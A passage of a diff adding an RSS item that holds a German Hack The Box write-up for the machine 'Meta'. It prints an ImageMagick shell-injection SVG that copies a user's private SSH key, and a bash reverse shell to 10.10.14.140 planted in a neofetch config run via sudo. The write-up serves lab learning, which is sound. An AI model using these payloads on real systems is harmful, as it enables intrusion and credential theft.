+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Das Ergebnis ist eine Reverse Shell als &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-meta-5.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&#34;erkundung-als-www-data&#34;&gt;
+    &lt;a href=&#34;#erkundung-als-www-data&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Erkundung als www-data
+&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;www-data&lt;/code&gt; hat leider keine Rechte, um auf interessante Informationen auf dem System zuzugreifen. Um die User-Flag zu erhalten, müssen die Rechte weiter ausgeweitet werden.&lt;/p&gt;
+&lt;p&gt;Ein Blick in die /etc/passwd` zeigt, dass es einen weiteren Benutzer namens Thomas auf dem System gibt. In dessen Home-Verzeichnis liegt die User-Flag.&lt;/p&gt;
+&lt;h3 id=&#34;laufende-prozesse-und-cronjobs&#34;&gt;
+    &lt;a href=&#34;#laufende-prozesse-und-cronjobs&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Laufende Prozesse und Cronjobs
+&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;pspy64&lt;/code&gt;&lt;sup id=&#34;fnref:5&#34;&gt;&lt;a href=&#34;#fn:5&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;5&lt;/a&gt;&lt;/sup&gt; zeigt nach einigen Minuten eine wiederkehrende Aufgabe an.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-meta-6.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Die wiederkehrende Aufgabe ruft &lt;code&gt;mogrify&lt;/code&gt; auf und wandelt alle Dateien in &lt;code&gt;/var/www/dev01.artcorp.htb/convert_images/&lt;/code&gt; in &lt;code&gt;.png&lt;/code&gt;-Dateien um.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;mogrify&lt;/code&gt; gehört zur ImageMagick-Bibliothek und die Version, die auf dem Server läuft, hat eine Shell Injection-Schwachstelle&lt;sup id=&#34;fnref:6&#34;&gt;&lt;a href=&#34;#fn:6&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;6&lt;/a&gt;&lt;/sup&gt;. Mithilfe des Proof-of-Concept auf der verlinkten Seite kann der private SSH-Schlüssel des Benutzers &lt;em&gt;Thomas&lt;/em&gt; ausgelesen werden.&lt;/p&gt;
+&lt;h2 id=&#34;rechteausweitung-auf-thomas-imagemagick-exploit&#34;&gt;
+    &lt;a href=&#34;#rechteausweitung-auf-thomas-imagemagick-exploit&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Rechteausweitung auf thomas (ImageMagick-Exploit)
+&lt;/h2&gt;
+&lt;p&gt;Um Thomas&amp;rsquo; SSH-Schlüssel zu erhalten, muss eine Datei mit dem Namen &lt;code&gt;poc.svg&lt;/code&gt; angelegt werden, die folgenden Inhalt hat:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-poc.svg&#34; data-lang=&#34;poc.svg&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;image&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;authenticate=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;ff&amp;#34; `echo $(cat ~/.ssh/id_rsa)&amp;gt; /dev/shm/key`;&amp;#34;&amp;#39;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;read&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;filename=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;pdf:/etc/passwd&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;get&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;width=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;base-width&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;height=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;base-height&amp;#34;&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;resize&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;geometry=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;400x400&amp;#34;&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;write&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;filename=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;test.png&amp;#34;&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;svg&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;width=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;700&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;height=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;700&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2000/svg&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns:xlink=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/1999/xlink&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;       
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;image&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xlink:href=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;msl:poc.svg&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;height=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;100&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;width=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;100&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;/svg&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/image&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Diese wird anschließend in das Verzeichnis &lt;code&gt;/var/www/dev01.artcorp.htb/convert_images/&lt;/code&gt; kopiert. Sobald der Cron Job ausgeführt worden ist, ist Thomas&amp;rsquo; privater SSH-Schlüssel in der Datei &lt;code&gt;/dev/shm/key&lt;/code&gt; abgespeichert und kann genutzt werden, um sich als Thomas auf dem System per SSH anzumelden und die User-Flag zu erhalten.&lt;/p&gt;
+&lt;h2 id=&#34;rechteausweitung-auf-root&#34;&gt;
+    &lt;a href=&#34;#rechteausweitung-auf-root&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Rechteausweitung auf root
+&lt;/h2&gt;
+&lt;p&gt;Als erstes lohnt sich ein Blick auf die mit &lt;code&gt;sudo&lt;/code&gt; ausführbaren Befehle.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;thomas@meta:~$ sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Matching Defaults entries &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; thomas on meta:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    env_reset, mail_badpass, &lt;span class=&#34;nv&#34;&gt;secure_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/bin, &lt;span class=&#34;nv&#34;&gt;env_keep&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;XDG_CONFIG_HOME
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User thomas may run the following commands on meta:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/neofetch &lt;span class=&#34;se&#34;&gt;\&amp;#34;\&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In der Ausgabe sind zwei Punkte hervorzuheben:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;env_keep+=XDG_CONFIG_HOME&lt;/code&gt; bewirkt, dass die Umgebungsvariable &lt;code&gt;XDG_CONFIG_HOME&lt;/code&gt; erhalten bleibt, wenn &lt;code&gt;sudo&lt;/code&gt; genutzt wird.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;(root) NOPASSWD: /usr/bin/neofetch \&amp;quot;\&amp;quot;&lt;/code&gt; bedeutet, dass &lt;code&gt;neofetch&lt;/code&gt; als root-Benutzer ausgeführt werden kann, ohne dass ein Kennwort eingegeben werden muss. Beim Start von &lt;code&gt;neofetch&lt;/code&gt; wird eine Konfigurationsdatei unter &lt;code&gt;~/.config/neofetch/config.conf&lt;/code&gt; benutzt.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Das bedeutet, dass, wenn die Umgebungsvariable &lt;code&gt;XDG_CONFIG_HOME&lt;/code&gt; auf das &lt;code&gt;~/.config&lt;/code&gt;-Verzeichnis zeigt, die &lt;code&gt;neofetch&lt;/code&gt;-Konfiguration als root ausgeführt wird.&lt;/p&gt;
+&lt;p&gt;Um eine Reverse Shell zu erhalten, wird die Datei &lt;code&gt;~/.config/neofetch/config.conf&lt;/code&gt; in der ersten Zeile wie folgt ergänzt:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bash -i &amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.14.140/1337 0&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Rest der Datei&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Außerdem wird die Umgebungsvariable wie folgt festgelegt:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;XDG_CONFIG_HOME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$HOME&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/.config&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Netcat-Listener nicht vergessen und &lt;code&gt;sudo /usr/bin/neofetch \&amp;quot;\&amp;quot;&lt;/code&gt; ausführen. Es sollte eine Reverse Shell als Root geöffnet werden, mit der die Root-Flag gelesen werden kann!&lt;/p&gt;
+&lt;h2 id=&#34;zusammenfassung&#34;&gt;
+    &lt;a href=&#34;#zusammenfassung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Zusammenfassung
+&lt;/h2&gt;
+&lt;p&gt;Die Maschine ist unter den als &lt;em&gt;Medium&lt;/em&gt; eingestuften Maschinen eine der leichteren und zeigt wie wichtig eine penible Erkundung des Zielsystems ist. Die Reverse Shell zu erhalten war ein echter Kampf, da alle anderen Versuche (zig Möglichkeiten durchprobiert) nicht funktioniert haben. Die Privilege Escalation zum Benutzer &lt;code&gt;root&lt;/code&gt; empfang ich als CTFig und nicht realistisch.&lt;/p&gt;
+&lt;p&gt;Alles in allem eine gute und unterhaltsame Maschine und definitiv für Anfänger geeignet!&lt;/p&gt;
+&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/xenophil90/shell-scripts/blob/main/fast-nmap.sh&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://github.com/xenophil90/shell-scripts/blob/main/fast-nmap.sh&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.exiftool.org&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://www.exiftool.org&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:3&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:3&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:4&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:4&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:5&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/DominicBreuker/pspy&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://github.com/DominicBreuker/pspy&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:5&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:6&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:6&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+    </description>
+    </item>
+    
   </channel>
 </rss>
